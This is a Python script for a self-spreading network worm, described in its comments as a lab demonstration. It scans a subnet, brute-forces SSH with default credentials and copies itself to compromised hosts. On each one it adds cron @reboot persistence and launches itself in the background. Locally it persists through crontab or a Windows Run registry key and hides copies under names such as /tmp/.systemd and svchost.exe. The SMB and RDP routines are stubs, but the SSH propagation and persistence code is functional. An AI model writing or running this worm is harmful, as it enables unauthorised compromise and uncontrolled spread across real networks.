import os
import sys
import socket
import threading
from concurrent.futures import ThreadPoolExecutor

import paramiko
import subprocess
from pathlib import Path
from time import sleep

# Configuration
SCAN_SUBNET = "192.168.1.0/24"  # Your lab subnet
KNOWN_PORTS = [22, 445, 3389]  # Common service ports
CREDS = [  # Simulated vulnerable credentials
    ('root', 'toor'),
    ('admin', 'admin'),
    ('user', 'password')
]
SELF_PATH = Path(__file__).resolve()
SIGNATURE = "W0RM_S1GN@TUR3"  # Infection marker
PAYLOAD = """print("Worm demo payload")"""


class NetworkWorm:
    def __init__(self):
        self.infected_hosts = set()
        self.scan_semaphore = threading.Semaphore(3)  # Limit concurrent scans

    def spread(self):
        """Main propagation method"""
        print("[*] Starting network scan...")
        self.scan_network()
        self.infect_discovered_hosts()
        self.execute_payload()

    def scan_network(self):
        """Discover vulnerable hosts in subnet"""
        import ipaddress
        network = ipaddress.ip_network(SCAN_SUBNET)

        with ThreadPoolExecutor(max_workers=10) as executor:
            for ip in network.hosts():
                executor.submit(self.check_host, str(ip))

    def check_host(self, ip):
        """Check host for vulnerable services"""
        with self.scan_semaphore:
            for port in KNOWN_PORTS:
                try:
                    with socket.create_connection((ip, port), timeout=2):
                        print(f"[+] Found open port {port} on {ip}")
                        self.attempt_infection(ip, port)
                except:
                    continue

    def attempt_infection(self, ip, port):
        """Try to infect target system"""
        if self.is_already_infected(ip):
            return

        try:
            if port == 22:  # SSH
                self.infect_via_ssh(ip)
            elif port == 445:  # SMB (simulated)
                self.infect_via_smb(ip)
            elif port == 3389:  # RDP (simulated)
                self.infect_via_rdp(ip)
        except Exception as e:
            print(f"[-] Infection failed on {ip}: {str(e)}")

    def infect_via_ssh(self, ip):
        """SSH-based infection simulation"""
        for user, passwd in CREDS:
            try:
                ssh = paramiko.SSHClient()
                ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                ssh.connect(ip, username=user, password=passwd, timeout=5)

                print(f"[*] Trying {user}:{passwd} on {ip}")

                # Copy worm to target
                sftp = ssh.open_sftp()
                sftp.put(__file__, "/tmp/.worm.py")

                # Create persistence
                ssh.exec_command("echo '@reboot python3 /tmp/.worm.py' | crontab -")

                # Execute worm
                ssh.exec_command("nohup python3 /tmp/.worm.py &")

                print(f"[!] Successfully infected {ip}")
                self.infected_hosts.add(ip)
                ssh.close()
                return
            except:
                continue

    def is_already_infected(self, ip):
        """Check infection marker"""
        try:
            with socket.create_connection((ip, 1337), timeout=1):
                return True  # Simulated infection check
        except:
            return False

    def execute_payload(self):
        """Harmless demonstration payload"""
        print("[*] Executing payload")
        with open("/tmp/worm_demo.txt", "w") as f:
            f.write("Worm demonstration successful\n")

    def create_persistence(self):
        """Self-preservation mechanism"""
        if os.name == 'posix':
            cron_entry = "@reboot python3 " + str(SELF_PATH)
            os.system(f"(crontab -l 2>/dev/null; echo '{cron_entry}') | crontab -")
        elif os.name == 'nt':
            reg_entry = r"Software\Microsoft\Windows\CurrentVersion\Run"
            os.system(f'reg add HKCU\\{reg_entry} /v UpdateService /t REG_SZ /d "{SELF_PATH}"')

    def self_replicate(self):
        """Copy self to vulnerable locations"""
        try:
            # Linux persistence
            if os.name == 'posix':
                os.system("cp {} /tmp/.systemd".format(sys.argv[0]))
                os.system("chmod +x /tmp/.systemd")

            # Windows persistence
            elif os.name == 'nt':
                appdata = os.getenv('APPDATA')
                os.system(f"copy {sys.argv[0]} {appdata}\\System32\\svchost.exe")
        except:
            pass

    def stop_worm(self):
        """Cleanup mechanism for lab environment"""
        if os.path.exists("/tmp/stop_worm"):
            if os.name == 'posix':
                os.system("crontab -r")
            elif os.name == 'nt':
                os.system("reg delete HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v UpdateService /f")
            sys.exit(0)


if __name__ == "__main__":
    worm = NetworkWorm()
    worm.self_replicate()
    worm.create_persistence()

    while True:
        worm.stop_worm()
        worm.spread()
        sleep(60)